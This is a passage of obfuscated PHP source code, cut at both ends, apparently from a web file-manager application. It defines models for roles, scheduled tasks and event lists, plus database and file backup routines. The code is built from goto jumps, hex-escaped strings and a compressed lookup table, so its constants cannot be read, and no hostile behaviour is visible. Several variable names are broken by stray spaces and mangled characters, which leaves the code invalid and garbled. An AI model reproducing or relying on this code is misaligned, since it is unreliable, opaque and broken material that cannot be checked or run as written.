$cìƒô†ÔÊÚ[$DµÎ—«˜[192]], $DµÎ—«˜[1505] => $DµÎ—«˜[33])); } goto cçŞ‡Œğæ£; cçŞ‡Œğæ£: return $this->eventListParse($dƒÎ»ÕŠÆô, $AƒõÒ×½»ë); goto d°ÇÓ“êõ÷; b‹Èç™Ç•ù: $DµÎ—«˜ =& $_SERVER[ÉóçÄÇ]; $cìƒô†ÔÊÚ = Model($DµÎ—«˜[1186])->sourceInfo($AƒõÒ×½»ë); $a’ÜğÍíšä = array($DµÎ—«˜[404] => $AƒõÒ×½»ë); goto D˜îÅŞ¤¶“; d°ÇÓ“êõ÷: } private function eventListParse($bïŒÀÆË‰, $f¶Í¯Ô±á†) { goto fè…ª£ğË; d°à±’£ä±: $EîÖœÈ§î = array_to_keyvalue($aö¿Ÿå†É, $A×„Õ÷¢ã[33], $A×„Õ÷¢ã[1889]); foreach ($aö¿Ÿå†É as $Aƒ©‰†åĞÅ) { $AÒ–²Ç›¾¸ = $Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[425]]; if ($Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[29]] == $A×„Õ÷¢ã[515] && isset($AÒ–²Ç›¾¸[$A×„Õ÷¢ã[1037]])) { $bÈÁìµ‡Äö[] = $AÒ–²Ç›¾¸[$A×„Õ÷¢ã[1037]] . $A×„Õ÷¢ã[33]; $bÈÁìµ‡Äö[] = $AÒ–²Ç›¾¸[$A×„Õ÷¢ã[1038]] . $A×„Õ÷¢ã[33]; } if ($Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[29]] == $A×„Õ÷¢ã[1897] && isset($AÒ–²Ç›¾¸[$A×„Õ÷¢ã[390]])) { $bÈÁìµ‡Äö[] = $AÒ–²Ç›¾¸[$A×„Õ÷¢ã[390]] . $A×„Õ÷¢ã[33]; } } $bÈÁìµ‡Äö = array_merge($bÈÁìµ‡Äö, $EîÖœÈ§î, array($f¶Í¯Ô±á† . $A×„Õ÷¢ã[33])); goto C« î¹éİô; fè…ª£ğË: $A×„Õ÷¢ã =& $_SERVER[ÉóçÄÇ]; $aö¿Ÿå†É = $bïŒÀÆË‰[$A×„Õ÷¢ã[365]]; $bÈÁìµ‡Äö = array_to_keyvalue($aö¿Ÿå†É, $A×„Õ÷¢ã[33], $A×„Õ÷¢ã[390]); goto d°à±’£ä±; C« î¹éİô: $bÈÁìµ‡Äö = array_unique($bÈÁìµ‡Äö); $Eã´–‰éá = array_unique(array_to_keyvalue($aö¿Ÿå†É, $A×„Õ÷¢ã[33], $A×„Õ÷¢ã[1511])); $fğ°ô‘ê‰ = Model($A×„Õ÷¢ã[501])->userListInfo($Eã´–‰éá); goto dª÷æˆÍ‘Æ; dª÷æˆÍ‘Æ: $Aİ›Ì©ÜÄ = Model($A×„Õ÷¢ã[776])->sourceListInfo($bÈÁìµ‡Äö, !0); foreach ($aö¿Ÿå†É as &$Aƒ©‰†åĞÅ) { if ($Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[29]] == $A×„Õ÷¢ã[515] && isset($Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[425]][$A×„Õ÷¢ã[1037]])) { $Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[425]][$A×„Õ÷¢ã[1037]] = $Aİ›Ì©ÜÄ[$Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[425]][$A×„Õ÷¢ã[1037]]]; $Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[425]][$A×„Õ÷¢ã[1038]] = $Aİ›Ì©ÜÄ[$Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[425]][$A×„Õ÷¢ã[1038]]]; } if ($Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[29]] == $A×„Õ÷¢ã[1897] && isset($Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[425]][$A×„Õ÷¢ã[390]])) { $Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[425]][$A×„Õ÷¢ã[390]] = $Aİ›Ì©ÜÄ[$Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[425]][$A×„Õ÷¢ã[390]]]; } $Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[84]] = $Aİ›Ì©ÜÄ[$Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[390]]]; $Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[1902]] = $Aİ›Ì©ÜÄ[$Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[1889]]]; if ($Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[29]] == $A×„Õ÷¢ã[1640]) { $Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[1902]] = $Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[84]]; $Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[1889]] = $Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[1902]][$A×„Õ÷¢ã[390]]; $Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[84]] = !1; $Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[390]] = $A×„Õ÷¢ã[33]; } $Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[1832]] = $fğ°ô‘ê‰[$Aƒ©‰†åĞÅ[$A×„Õ÷¢ã[1511]]]; } unset($Aƒ©‰†åĞÅ); goto DÁöº„‡¹â; DÁöº„‡¹â: $bïŒÀÆË‰[$A×„Õ÷¢ã[365]] = $aö¿Ÿå†É; return $bïŒÀÆË‰; goto eœ®“Ìä–; eœ®“Ìä–: } public function removeBySource($Bœ¾ßë©) { $BÑÉ‡ÔìÜ = array($_SERVER[ÉóçÄÇ][404] => $Bœ¾ßë©); $this->where($BÑÉ‡ÔìÜ)->remove(); } } goto C—Œô“ˆĞ; DÖ’µ¹ğâ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\x2e\x72\x6f\x6c\145\x4c\151\163\x74"; public $field = array("\x6e\x61\155\x65", "\x61\165\164\150", "\x6c\141\142\x65\154", "\144\x69\x73\160\154\x61\171", "\163\171\x73\164\145\155", "\x64\x65\x73\143", "\151\x67\x6e\157\x72\x65\x45\170\164", "\x69\x67\156\x6f\x72\x65\x46\151\x6c\145\123\x69\x7a\145", "\x61\144\155\151\156\151\x73\x74\162\x61\164\157\x72", "\163\157\162\164"); public function listData($b«ßÁöæÆä = false, $Dß²ĞŠËô = "\x73\x6f\x72\164", $bŞß¾Ïôä¨ = false) { $dÓš®œĞ“ =& $_SERVER[ÉóçÄÇ]; $EÈî¨â¯ãÛ = parent::listData($b«ßÁöæÆä, $Dß²ĞŠËô, $bŞß¾Ïôä¨); if (!$b«ßÁöæÆä) { foreach ($EÈî¨â¯ãÛ as $b‹³é÷ÒƒÆ => $fˆåÎÓô­) { if ($fˆåÎÓô­[$dÓš®œĞ“[1864]] == 1) { $EÈî¨â¯ãÛ[$b‹³é÷ÒƒÆ][$dÓš®œĞ“[425]] = LNG($dÓš®œĞ“[2084]); } } } return $EÈî¨â¯ãÛ; } public function update($E‰¼­ ·è, $f¸«¤ÖÅ”) { goto c…ÌàÜ†µ; c…ÌàÜ†µ: $dÏ¾õæìÎ =& $_SERVER[ÉóçÄÇ]; $FöŞ‡à½ = parent::listData($E‰¼­ ·è); $aªÊ¹¸Ô´ = $this->findByName($f¸«¤ÖÅ”[$dÏ¾õæìÎ[28]]); goto FÁ¾™®©Ñ©; cÜåÛ¸ç˜ª: return parent::update($E‰¼­ ·è, $f¸«¤ÖÅ”); goto dÊ…Ä¢±Î´; FÁ¾™®©Ñ©: if (!$FöŞ‡à½ || $aªÊ¹¸Ô´ && $aªÊ¹¸Ô´[$dÏ¾õæìÎ[388]] != $FöŞ‡à½[$dÏ¾õæìÎ[388]]) { return !1; } if ($aªÊ¹¸Ô´[$dÏ¾õæìÎ[1864]] == 1) { $f¸«¤ÖÅ” = array($dÏ¾õæìÎ[28] => $f¸«¤ÖÅ”[$dÏ¾õæìÎ[28]], $dÏ¾õæìÎ[1695] => $f¸«¤ÖÅ”[$dÏ¾õæìÎ[1695]]); } $this->filterAuth($f¸«¤ÖÅ”[$dÏ¾õæìÎ[400]]); goto cÜåÛ¸ç˜ª; dÊ…Ä¢±Î´: } public function remove($Cµ¬ÌµâËÆ) { $b¿Û‹“Ôí¥ = parent::listData($Cµ¬ÌµâËÆ); if (!$b¿Û‹“Ôí¥ || $b¿Û‹“Ôí¥[$_SERVER[ÉóçÄÇ][1151]]) { return !1; } return parent::remove($Cµ¬ÌµâËÆ); } public function add($EŠ‹‚·¥í¸) { goto dÁ·»ÌÁºÇ; c”îÌ¬¥: return parent::insert($EŠ‹‚·¥í¸); goto d¦®ÕÈ¡šÂ; dÁ·»ÌÁºÇ: $dë™–é¥¤Ë =& $_SERVER[ÉóçÄÇ]; $cäÈ‡´ñ„ = $EŠ‹‚·¥í¸[$dë™–é¥¤Ë[28]]; if ($this->findByName($cäÈ‡´ñ„)) { return !1; } goto b·‡œî†Û; b·‡œî†Û: $E¸İŠøÎÓ× = array($dë™–é¥¤Ë[407] => $cäÈ‡´ñ„, $dë™–é¥¤Ë[1680] => $dë™–é¥¤Ë[33], $dë™–é¥¤Ë[1676] => $dë™–é¥¤Ë[1684], $dë™–é¥¤Ë[2085] => 1, $dë™–é¥¤Ë[1679] => 0, $dë™–é¥¤Ë[2086] => 0, $dë™–é¥¤Ë[1678] => $this->getSort()); $EŠ‹‚·¥í¸ = array_merge($E¸İŠøÎÓ×, $EŠ‹‚·¥í¸); $this->filterAuth($EŠ‹‚·¥í¸[$dë™–é¥¤Ë[400]]); goto c”îÌ¬¥; d¦®ÕÈ¡šÂ: } private function getSort() { $eŞÒá“äš =& $_SERVER[ÉóçÄÇ]; $F†¦ßòôà = parent::listData(); $D£¡å†ˆê = array_to_keyvalue($F†¦ßòôà, $eŞÒá“äš[33], $eŞÒá“äš[1697]); return empty($D£¡å†ˆê) ? 0 : max($D£¡å†ˆê) + 1; } private function filterAuth(&$Cé³†š©î) { $BÆ¯¿‡à´© =& $_SERVER[ÉóçÄÇ]; $aè¨¾¶Ÿ—ç = array(); $D‚Œ‹®…” = array_filter(explode($BÆ¯¿‡à´©[47], $Cé³†š©î)); foreach ($D‚Œ‹®…” as $Cé³†š©î) { $A˜ïğÌ·Ïœ = explode($BÆ¯¿‡à´©[94], $Cé³†š©î); if ($A˜ïğÌ·Ïœ[0] == $BÆ¯¿‡à´©[2087] && $A˜ïğÌ·Ïœ[1] != $BÆ¯¿‡à´©[1072]) { $CÆâõ¬ÆÄ = $A˜ïğÌ·Ïœ[0] . $BÆ¯¿‡à´©[94] . $A˜ïğÌ·Ïœ[1] . $BÆ¯¿‡à´©[2088]; if (!in_array($CÆâõ¬ÆÄ, $D‚Œ‹®…”)) { $aè¨¾¶Ÿ—ç[] = $CÆâõ¬ÆÄ; } } $aè¨¾¶Ÿ—ç[] = $Cé³†š©î; } $Cé³†š©î = implode($BÆ¯¿‡à´©[47], $aè¨¾¶Ÿ—ç); } public function sort($E‚Ïù¾†»µ, $f¢˜¡ØŸ¢‰) { return parent::update($E‚Ïù¾†»µ, $f¢˜¡ØŸ¢‰); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\56\164\x61\163\153\114\x69\x73\x74"; public $field = array("\156\x61\155\x65", "\x74\171\x70\x65", "\145\x76\145\x6e\x74", "\x74\x69\155\145", "\144\x65\x73\x63", "\x73\171\163\164\145\x6d", "\145\x6e\141\x62\154\145", "\154\x61\x73\x74\x52\x75\156", "\x73\157\x72\164"); public function listData($AòˆˆÓ©† = false, $CïšÎ×°Ş§ = "\x73\x6f\x72\164", $f©Œ«óÁâñ = false) { return parent::listData($AòˆˆÓ©†, $CïšÎ×°Ş§, $f©Œ«óÁâñ); } public function add($D‡Ï’ŠŠã¹) { $fãùëÂë… =& $_SERVER[ÉóçÄÇ]; $d”¤¥ƒ¹µ³ = $this->findByName($D‡Ï’ŠŠã¹[$fãùëÂë…[28]]); if ($d”¤¥ƒ¹µ³) { return !1; } $D‡Ï’ŠŠã¹[$fãùëÂë…[1475]] = 0; $D‡Ï’ŠŠã¹[$fãùëÂë…[1697]] = $this->getSort(); return parent::insert($D‡Ï’ŠŠã¹); } private function getSort() { $b®§ÃÍ­ïï =& $_SERVER[ÉóçÄÇ]; $aò¿Áêƒ·è = parent::listData(); $FÚƒÊ™ËÒ¶ = array_to_keyvalue($aò¿Áêƒ·è, $b®§ÃÍ­ïï[33], $b®§ÃÍ­ïï[1697]); return empty($FÚƒÊ™ËÒ¶) ? 0 : max($FÚƒÊ™ËÒ¶) + 1; } public function update($c±´ÂÈÙŠ, $f Ö·æ®ìÍ) { $DºĞÛ„‘‚Ğ =& $_SERVER[ÉóçÄÇ]; $DÄù·ÒÖÚÀ = $this->listData($c±´ÂÈÙŠ); $aÅÌ‡ÍÌ‰‡ = $this->findByName($f Ö·æ®ìÍ[$DºĞÛ„‘‚Ğ[28]]); if (!$DÄù·ÒÖÚÀ || $aÅÌ‡ÍÌ‰‡ && $aÅÌ‡ÍÌ‰‡[$DºĞÛ„‘‚Ğ[388]] != $DÄù·ÒÖÚÀ[$DºĞÛ„‘‚Ğ[388]]) { return !1; } return parent::update($c±´ÂÈÙŠ, $f Ö·æ®ìÍ); } public function remove($Dõ«»§¹ÁÀ, $Côõ¼ß²½  = false) { $dÉËÁ¿­‹È =& $_SERVER[ÉóçÄÇ]; $bĞ¹…ªòÁ¨ = $this->listData($Dõ«»§¹ÁÀ); if (!$bĞ¹…ªòÁ¨) { return; } if (!$Côõ¼ß²½  && $bĞ¹…ªòÁ¨[$dÉËÁ¿­‹È[1151]] == $dÉËÁ¿­‹È[86]) { return !1; } return parent::remove($Dõ«»§¹ÁÀ); } public function enable($cèø†çê…, $FºŒ‰è®Ø) { return $this->update($cèø†çê…, array($_SERVER[ÉóçÄÇ][2079] => $FºŒ‰è®Ø)); } public function run($Bò³ ‘íìŞ) { return $this->update($Bò³ ‘íìŞ, array($_SERVER[ÉóçÄÇ][2089] => time())); } } goto E°‡¾í´£; eÂ›ƒ¼Î¶‰: define($_SERVER[ÉóçÄÇ][0], $_SERVER[ÉóçÄÇ][1]); $_SERVER[®Ãó…·ÈëÁ] = explode($_SERVER[ÉóçÄÇ][2], gzinflate(substr($_SERVER[ÉóçÄÇ][3], 10, -8))); function binCheckEq($AéˆŒ×—¥˜, $cášÈä†‡) { return $AéˆŒ×—¥˜ == $cášÈä†‡; } goto c‰ÕÒŒÛ†; E’Ëê¼êÑÌ: class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto Cù—³—¾©‰; e¨ˆ…âç×: $FšĞÎ²Ÿˆ§ = array($E·óß‹ÜŒè[743] => $D•ß¥“Ñ„ë, $E·óß‹ÜŒè[728] => 1, $E·óß‹ÜŒè[744] => $d’èÄ£Ë²à, $E·óß‹ÜŒè[745] => $a§ ¬˜¹¶); Backup::set($FšĞÎ²Ÿˆ§); if ($d’èÄ£Ë²à > $a§ ¬˜¹¶) { return !1; } goto D…óÂõ“§Æ; b·‹Ğë¶†: $fÃÙÇÃÒÁ† = new DbManage($FÆİÀ©ñ‡Ù, $D•ß¥“Ñ„ë); $fø ®ÇäŠ× = TEMP_FILES . $E·óß‹ÜŒè[731] . self::$name . $E·óß‹ÜŒè[8]; del_dir($fø ®ÇäŠ×); goto FšÔôŒÇÁÎ; FšÔôŒÇÁÎ: mk_dir($fø ®ÇäŠ×); $d’èÄ£Ë²à = $a§ ¬˜¹¶ = 0; try { $E»Ä±‘Şò = $fÃÙÇÃÒÁ†->db()->getTables(); } catch (Exception $aˆø‘¼°Ÿ) { return !1; } goto C å¶ç¨ñŸ; D…óÂõ“§Æ: return !0; goto e´³±óéåÊ; DÁÛòŠ²–Ç: self::$name = $bËê…åôÙÜ[$E·óß‹ÜŒè[28]]; $FÆİÀ©ñ‡Ù = $GLOBALS[$E·óß‹ÜŒè[6]][$E·óß‹ÜŒè[17]]; $D•ß¥“Ñ„ë = $this->_dbType($FÆİÀ©ñ‡Ù); goto b·‹Ğë¶†; Cù—³—¾©‰: $E·óß‹ÜŒè =& $_SERVER[ÉóçÄÇ]; $bËê…åôÙÜ = Backup::get(); self::$io = $bËê…åôÙÜ[$E·óß‹ÜŒè[713]]; goto DÁÛòŠ²–Ç; CÅ²†‰ÌÅ¹: foreach ($E»Ä±‘Şò as $Eù¢›õŞ’´) { $D´ÁØëÈ‹‰ = $fø ®ÇäŠ× . $Eù¢›õŞ’´ . $E·óß‹ÜŒè[739]; $eÄŸ§Ÿ¬Îù = null; if ($Eù¢›õŞ’´ == $E·óß‹ÜŒè[740] && (!isset($bËê…åôÙÜ[$E·óß‹ÜŒè[714]]) || $bËê…åôÙÜ[$E·óß‹ÜŒè[714]] == $E·óß‹ÜŒè[491])) { $eÄŸ§Ÿ¬Îù = self::$io; } $a§ ¬˜¹¶ += $fÃÙÇÃÒÁ†->sqlFromDb($Eù¢›õŞ’´, $D´ÁØëÈ‹‰, $Dé¡ìˆ¯¾, $eÄŸ§Ÿ¬Îù); } if (isset($Dé¡ìˆ¯¾->task[$E·óß‹ÜŒè[741]])) { $c¯ªñ©ù‡ = $Dé¡ìˆ¯¾->task[$E·óß‹ÜŒè[741]] ? $Dé¡ìˆ¯¾->task[$E·óß‹ÜŒè[741]] : timeFloat(); $cŠù…¯êã× = $c¯ªñ©ù‡ - $Dé¡ìˆ¯¾->task[$E·óß‹ÜŒè[742]]; if ($cŠù…¯êã× >= 0.2) { $d’èÄ£Ë²à += 1; } } $Dé¡ìˆ¯¾->end(); goto e¨ˆ…âç×; C å¶ç¨ñŸ: $E»Ä±‘Şò = array_diff($E»Ä±‘Şò, array($E·óß‹ÜŒè[732], $E·óß‹ÜŒè[733])); foreach ($E»Ä±‘Şò as $Eù¢›õŞ’´) { $d’èÄ£Ë²à += $fÃÙÇÃÒÁ†->model($Eù¢›õŞ’´)->count(); } $Dé¡ìˆ¯¾ = new Task($E·óß‹ÜŒè[734], $E·óß‹ÜŒè[735], $d’èÄ£Ë²à, LNG($E·óß‹ÜŒè[736]) . $E·óß‹ÜŒè[737] . LNG($E·óß‹ÜŒè[738])); goto CÅ²†‰ÌÅ¹; e´³±óéåÊ: } private function _dbType($E·ùÓŒË‰) { goto bæÁ‚ÏÖÎ; bæÁ‚ÏÖÎ: $bÃÎ‚ÜÊí =& $_SERVER[ÉóçÄÇ]; $E·ùÓŒË‰ = array_change_key_case($E·ùÓŒË‰); $Aé’Ó°é³ = $E·ùÓŒË‰[$bÃÎ‚ÜÊí[746]]; goto d•¯­ëÄ´; C‘“à©ÑÛ: return $Aé’Ó°é³; goto FëÍæËõ©; d•¯­ëÄ´: if ($Aé’Ó°é³ == $bÃÎ‚ÜÊí[747]) { $cõ˜áõ¿³ò = explode($bÃÎ‚ÜÊí[4], $E·ùÓŒË‰[$bÃÎ‚ÜÊí[748]]); $Aé’Ó°é³ = $cõ˜áõ¿³ò[0]; } $aë®¿®åè = array($bÃÎ‚ÜÊí[749] => $bÃÎ‚ÜÊí[9], $bÃÎ‚ÜÊí[750] => $bÃÎ‚ÜÊí[751]); if (isset($aë®¿®åè[$Aé’Ó°é³])) { $Aé’Ó°é³ = $aë®¿®åè[$Aé’Ó°é³]; } goto C‘“à©ÑÛ; FëÍæËõ©: } } class BackupDbFile { public function __construct() { } public function index() { goto cì‚õÌ¢; F°ŠÔ‡ˆ«‡: $aµ¨Ğ¦ƒ£¼ = TEMP_FILES . "\142\141\143\x6b\x75\160\137{$C¥÷‘À»ƒÆ}\57"; $CËòÁŒƒ¹• = "\x7b\151\157\x3a{$d÷ò©ÓÔç[$bÑŠ«¦”Á‰[713]]}\175\x2f\144\141\164\x61\x62\x61\x73\x65\57\142\x61\143\153\x75\x70\137{$C¥÷‘À»ƒÆ}\57"; if (!($CËòÁŒƒ¹• = IO::mkdir($CËòÁŒƒ¹•))) { return !1; } goto EóÓ·ïäõå; EóÓ·ïäõå: $bĞáìÚ‰‰î = IO::listPath($aµ¨Ğ¦ƒ£¼); $aâ‡ùÇ¨Ğó = isset($bĞáìÚ‰‰î[$bÑŠ«¦”Á‰[73]]) ? $bĞáìÚ‰‰î[$bÑŠ«¦”Á‰[73]] : array(); $Eáˆ†‚ÅôÒ = array_sum(array_column($aâ‡ùÇ¨Ğó, $bÑŠ«¦”Á‰[77])); goto eñ¹“‹ñİ; eñ¹“‹ñİ: if (!$Eáˆ†‚ÅôÒ) { return !1; } Backup::set(array($bÑŠ«¦”Á‰[752] => $Eáˆ†‚ÅôÒ)); $bˆçë®’é = new TaskFileTransfer($bÑŠ«¦”Á‰[753], $bÑŠ«¦”Á‰[735], count($aâ‡ùÇ¨Ğó), LNG($bÑŠ«¦”Á‰[736]) . $bÑŠ«¦”Á‰[434] . LNG($bÑŠ«¦”Á‰[738]) . $bÑŠ«¦”Á‰[754]); goto B¨®ç…”‹Ü; cì‚õÌ¢: $bÑŠ«¦”Á‰ =& $_SERVER[ÉóçÄÇ]; $d÷ò©ÓÔç = Backup::get(); $C¥÷‘À»ƒÆ = $d÷ò©ÓÔç[$bÑŠ«¦”Á‰[28]]; goto F°ŠÔ‡ˆ«‡; B¨®ç…”‹Ü: $bˆçë®’é->task[$bÑŠ«¦”Á‰[720]] = $Eáˆ†‚ÅôÒ; foreach ($bĞáìÚ‰‰î[$bÑŠ«¦”Á‰[73]] as $D‡˜ó‘÷¨) { $aÜñ†¾ø¥† = IO::move($D‡˜ó‘÷¨[$bÑŠ«¦”Á‰[75]], $CËòÁŒƒ¹•); if (!$aÜñ†¾ø¥†) { $bˆçë®’é->end(); $Dè«ÈÉ¥® = IO::getLastError($bÑŠ«¦”Á‰[755] . $D‡˜ó‘÷¨[$bÑŠ«¦”Á‰[75]] . $bÑŠ«¦”Á‰[756] . $CËòÁŒƒ¹• . $bÑŠ«¦”Á‰[499]); write_log($Dè«ÈÉ¥®, $bÑŠ«¦”Á‰[735]); return !1; } } $F®”™ùŞÇÌ = CONTROLLER_DIR . $bÑŠ«¦”Á‰[757]; goto fË¥‚ºãÀ; fË¥‚ºãÀ: $B£ô±œ’Áå = CONTROLLER_DIR . $bÑŠ«¦”Á‰[758]; IO::copy($F®”™ùŞÇÌ, $CËòÁŒƒ¹•); IO::copy($B£ô±œ’Áå, $CËòÁŒƒ¹•); goto f¡æ™ÖàŞ’; f¡æ™ÖàŞ’: $bˆçë®’é->end(); Backup::set(array($bÑŠ«¦”Á‰[759] => $Eáˆ†‚ÅôÒ)); return !0; goto Aé¬ÙÉ¬ÈÄ; Aé¬ÙÉ¬ÈÄ: } } class BackupFile { public function __construct() { } public function index() { goto a…æÈ²Ãİ; DÓ‘ª¾³ÛÕ: $aŠª«Ü”´› = !0; $d‡ÎƒÈ°ÑÀ = $this->storeIds(); $E‰Áè³‡Ÿ = 1; goto c‹ø±¸”Íè; a…æÈ²Ãİ: $FğÚ²“—­Ê = Backup::get(); $cŸŒ”¹ · = $FğÚ²“—­Ê[$_SERVER[ÉóçÄÇ][289]][$_SERVER[ÉóçÄÇ][173]][$_SERVER[ÉóçÄÇ][441]]; $AãÊÖš‹… = array($_SERVER[ÉóçÄÇ][442] => array($_SERVER[ÉóçÄÇ][760], $cŸŒ”¹ ·), $_SERVER[ÉóçÄÇ][761] => array($_SERVER[ÉóçÄÇ][327], $FğÚ²“—­Ê[$_SERVER[ÉóçÄÇ][713]])); goto A˜ìğÛ×¡; c‹ø±¸”Íè: $C¬Ä‘Ç²› = 1000; $Dâ®ªŸš = $fä¯¶ãñë = 0; $dŒÙ®ÓŒøÚ = array(); goto A§Ä¼ØƒîÖ; A˜ìğÛ×¡: $fÄÀ¿Û¶Ôî = (int) Model($_SERVER[ÉóçÄÇ][740])->where($AãÊÖš‹…)->count($_SERVER[ÉóçÄÇ][441]); $c–êêÊ‰Ï« = (int) Model($_SERVER[ÉóçÄÇ][740])->where($AãÊÖš‹…)->sum($_SERVER[ÉóçÄÇ][77]); $A‡íˆÏ„Ê· = new TaskFileTransfer($_SERVER[ÉóçÄÇ][762], $_SERVER[ÉóçÄÇ][735], $fÄÀ¿Û¶Ôî, LNG($_SERVER[ÉóçÄÇ][736]) . $_SERVER[ÉóçÄÇ][737] . LNG($_SERVER[ÉóçÄÇ][763])); goto a¦‚÷„ö‘¨; aÊ‹ìÀÈ‰¼: $Eç®ö—¤ô® = array($_SERVER[ÉóçÄÇ][775] => 1, $_SERVER[ÉóçÄÇ][470] => time(), $_SERVER[ÉóçÄÇ][730] => 1, $_SERVER[ÉóçÄÇ][772] => $cŸŒ”¹ ·, $_SERVER[ÉóçÄÇ][765] => $c–êêÊ‰Ï«, $_SERVER[ÉóçÄÇ][764] => $fÄÀ¿Û¶Ôî); if ($fä¯¶ãñë) { $Eç®ö—¤ô®[$_SERVER[ÉóçÄÇ][773]] = $FğÌ„ê…‰º; $Eç®ö—¤ô®[$_SERVER[ÉóçÄÇ][774]] = $Câ²¹ê¦; } Backup::set($Eç®ö—¤ô®); goto EïÊò†„; EïÊò†„: $this->_fileFilter($dŒÙ®ÓŒøÚ); return !0; goto DÚ÷Ï«§; a¦‚÷„ö‘¨: $A‡íˆÏ„Ê·->task[$_SERVER[ÉóçÄÇ][720]] = $c–êêÊ‰Ï«; $Eç®ö—¤ô® = array($_SERVER[ÉóçÄÇ][764] => $fÄÀ¿Û¶Ôî, $_SERVER[ÉóçÄÇ][765] => $c–êêÊ‰Ï«); Backup::set($Eç®ö—¤ô®); goto DÓ‘ª¾³ÛÕ; A§Ä¼ØƒîÖ: $Câ²¹ê¦ = $FğÌ„ê…‰º = 0; do { $E­ã°Ô–î = $_SERVER[ÉóçÄÇ][766]; $dÁÆÛÏ¿¹¿ = Model($_SERVER[ÉóçÄÇ][740])->where($AãÊÖš‹…)->field($E­ã°Ô–î)->order($_SERVER[ÉóçÄÇ][767])->selectPage($C¬Ä‘Ç²›, $E‰Áè³‡Ÿ); $e¹å¤©ò‚§ = !empty($dÁÆÛÏ¿¹¿[$_SERVER[ÉóçÄÇ][365]]) ? $dÁÆÛÏ¿¹¿[$_SERVER[ÉóçÄÇ][365]] : array(); foreach ($e¹å¤©ò‚§ as $däíÒÃŞãÌ) { goto eÎ„…ì½Ç˜; f¢„ôù²†ò: if (IO::exist($b£âßÖñ¯)) { $A‡íˆÏ„Ê·->updateFileEnd($däíÒÃŞãÌ[$_SERVER[ÉóçÄÇ][28]], $däíÒÃŞãÌ[$_SERVER[ÉóçÄÇ][77]]); } else { $b£âßÖñ¯ = get_path_father($b£âßÖñ¯); IO::mkdir($b£âßÖñ¯); if (!IO::copy($CØ††÷ÂŸ», $b£âßÖñ¯, $_SERVER[ÉóçÄÇ][770])) { write_log($_SERVER[ÉóçÄÇ][771] . $CØ††÷ÂŸ» . $_SERVER[ÉóçÄÇ][756] . $b£âßÖñ¯ . $_SERVER[ÉóçÄÇ][499], $_SERVER[ÉóçÄÇ][735]); $aŠª«Ü”´› = !1; break; } } $cŸŒ”¹ · = $däíÒÃŞãÌ[$_SERVER[ÉóçÄÇ][441]]; $fä¯¶ãñë += 1; goto F¶İ©À×¾ô; Dª²¹Ş†©¶: if ($Dâ®ªŸš >= 1024 * 1024 * 100) { $Eç®ö—¤ô® = array($_SERVER[ÉóçÄÇ][772] => $cŸŒ”¹ ·, $_SERVER[ÉóçÄÇ][773] => $FğÌ„ê…‰º, $_SERVER[ÉóçÄÇ][774] => $Câ²¹ê¦); Backup::set($Eç®ö—¤ô®); $Dâ®ªŸš = $fä¯¶ãñë = 0; } goto d™ñ¯ß‡²´; F¶İ©À×¾ô: $Dâ®ªŸš += $däíÒÃŞãÌ[$_SERVER[ÉóçÄÇ][77]]; $FğÌ„ê…‰º += 1; $Câ²¹ê¦ += $däíÒÃŞãÌ[$_SERVER[ÉóçÄÇ][77]]; goto Dª²¹Ş†©¶; eÎ„…ì½Ç˜: if (!$this->_fileExist($däíÒÃŞãÌ, $dŒÙ®ÓŒøÚ, $d‡ÎƒÈ°ÑÀ)) { $fÄÀ¿Û¶Ôî -= 1; $c–êêÊ‰Ï« -= (int) $däíÒÃŞãÌ[$_SERVER[ÉóçÄÇ][77]]; write_log("\x66\151\x6c\x65\40\156\157\x74\x20\x65\x78\151\163\x74\56\146\151\x6c\x65\111\x44\x3a{$däíÒÃŞãÌ[$_SERVER[ÉóçÄÇ][441]]}\54\40\x70\141\164\150\x3a{$däíÒÃŞãÌ[$_SERVER[ÉóçÄÇ][75]]}", $_SERVER[ÉóçÄÇ][768]); continue; } $CØ††÷ÂŸ» = $däíÒÃŞãÌ[$_SERVER[ÉóçÄÇ][75]]; $b£âßÖñ¯ = "\173\x69\x6f\x3a{$FğÚ²“—­Ê[$_SERVER[ÉóçÄÇ][713]]}\175" . substr($CØ††÷ÂŸ», strlen("\x7b\151\157\72{$däíÒÃŞãÌ[$_SERVER[ÉóçÄÇ][769]]}\175")); goto f¢„ôù²†ò; d™ñ¯ß‡²´: } $e¥§²–½›Œ = count($e¹å¤©ò‚§); $E‰Áè³‡Ÿ++; } while ($e¥§²–½›Œ == $C¬Ä‘Ç²›); $A‡íˆÏ„Ê·->end(); goto aÊ‹ìÀÈ‰¼; DÚ÷Ï«§: } private function _fileExist($E×â–ÎïÚ, &$fæ¾âŸê¢¯, $fÑê‰ÍÍ‹Ò) { goto aŒ‚ë®Œ³â; bŒ¼÷éã„¬: $fæ¾âŸê¢¯ = array_merge($fæ¾âŸê¢¯, array_to_keyvalue($c¶ƒ©ô¾„Í, $fêâ‡ÍÇ[33], $fêâ‡ÍÇ[441])); return !1; goto fºÏùÓìÆí; dÂä—²„åµ: if (!in_array($E×â–ÎïÚ[$fêâ‡ÍÇ[769]], 